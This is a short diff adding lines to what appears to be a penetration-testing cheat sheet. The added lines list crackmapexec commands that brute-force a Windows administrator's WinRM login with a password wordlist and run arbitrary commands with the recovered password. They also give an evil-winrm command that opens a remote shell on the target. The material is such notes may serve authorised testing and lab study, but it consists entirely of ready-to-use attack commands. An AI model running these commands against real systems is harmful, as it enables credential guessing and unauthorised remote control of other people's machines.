@@ -28,3 +28,15 @@ set USERNAME administrator
 set PASSWORD <password>
 set FORCE_VBS true
 ```
+
+```
+which crackmapexec
+crackmapexec
+crackmapexec winrm <ip> -u administrator -p /usr/share/wordlists/metasploit/unix_passwords.txt
+crackmapexec winrm <ip> -u administrator -p <password> -x "<cmd>"
+```
+
+```
+which evil-winrm.rb
+evil-winrm.rb -u administrator -p '<password>' -i <ip>
+```
